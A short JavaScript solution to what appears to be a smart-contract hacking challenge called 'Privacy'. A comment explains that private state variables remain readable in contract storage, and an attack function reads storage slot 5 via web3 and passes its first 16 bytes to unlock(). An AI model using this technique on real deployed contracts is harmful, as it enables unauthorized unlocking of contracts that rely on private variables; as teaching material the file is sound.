/**

Privacy
 
Vulnerability:
Accessibility of Private State Variables

Preventative Techniques:
Do not store sensitive data on-chain
Private access modifier is used for restricting direct access
But the data is publicly avaliable on the storage of the contract

*/

const attack = async () => {

    const data_2 = await web3.eth.getStorageAt(contract.address, 5);

    const bytes16_Of_Data_2 = data_2.substring(0, 34)

    await contract.unlock(bytes16_Of_Data_2);
}
